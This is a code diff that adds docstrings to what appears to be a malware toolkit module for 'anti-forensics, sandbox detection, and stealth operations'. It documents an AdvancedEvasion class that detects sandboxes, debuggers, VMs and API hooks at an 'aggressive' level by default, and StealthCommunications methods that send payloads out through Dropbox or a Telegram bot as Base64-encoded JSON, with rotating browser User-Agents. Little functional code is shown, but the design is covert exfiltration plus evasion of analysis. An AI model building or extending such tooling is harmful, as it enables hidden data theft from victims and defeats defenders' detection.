@@ -1,4 +1,3 @@
-
 """
 Advanced evasion techniques for anti-forensics, sandbox detection, and stealth operations
 """
@@ -30,6 +29,25 @@ class AdvancedEvasion:
     """
     
     def __init__(self, profile=None):
+        """
+        Initialize AdvancedEvasion with an optional configuration profile.
+        
+        Parameters:
+            profile (dict, optional): Configuration dictionary. Recognized keys:
+                - 'evasion_level' (str): One of 'minimal', 'normal', or 'aggressive' controlling which technique set to load.
+                - 'notifications' (dict): Notification configuration; supports a 'telegram' sub-dictionary with:
+                    - 'enabled' (bool): Whether Telegram notifications are enabled.
+                    - 'bot_token' (str): Telegram bot token (used if TELEGRAM_BOT_TOKEN env var is not set).
+                    - 'chat_id' (str|int): Telegram chat identifier (used if TELEGRAM_CHAT_ID env var is not set).
+        
+        Behavior:
+            Sets internal detection flags and state (sandbox, debugger, VM, hooked APIs), loads the selected evasion
+            techniques for the configured evasion level, and initializes API-hook detection state.
+        
+        Environment:
+            TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables, if present, override corresponding values
+            in the profile's telegram configuration.
+        """
         self.profile = profile or {}
         self.evasion_level = self.profile.get('evasion_level', 'aggressive')
         self.sandbox_detected = False
@@ -975,12 +993,31 @@ class StealthCommunications:
             return None
     
     def _send_dropbox(self, data):
-        """Send data via Dropbox"""
+        """
+        Attempt to upload the provided payload to a configured Dropbox account.
+        
+        Parameters:
+            data (bytes | dict | str): Payload to upload; raw bytes or a JSON-serializable object.
+        
+        Returns:
+            file_id (str): ID or path of the uploaded file on Dropbox if the upload succeeds, `None` otherwise.
+        """
         # Similar to Google Drive
         return None
     
     def _send_telegram(self, data):
-        """Send data via Telegram bot using configured credentials."""
+        """
+        Transmit the given payload to the configured Telegram chat using the instance's bot credentials.
+        
+        Encodes the payload as JSON then Base64, sends up to Telegram's message size limit, and returns a simple status on success. Requires the instance attributes `telegram_enabled`, `telegram_token`, and `telegram_chat_id` to be set; if sending is disabled, credentials are missing, or sending fails, the function returns None.
+        
+        Parameters:
+            data: The payload to transmit (will be JSON-serialized and Base64-encoded).
+        
+        Returns:
+            dict: {'status': 'sent'} on success.
+            None: if Telegram is disabled, credentials are missing, or sending fails.
+        """
         try:
             import telebot  # Provided by pyTelegramBotAPI
 
@@ -999,7 +1036,12 @@ class StealthCommunications:
             return None
     
     def _get_random_user_agent(self):
-        """Get random User-Agent string"""
+        """
+        Selects a random User-Agent string from a small curated set of common browsers and platforms.
+        
+        Returns:
+            str: A User-Agent header string suitable for HTTP requests.
+        """
         user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
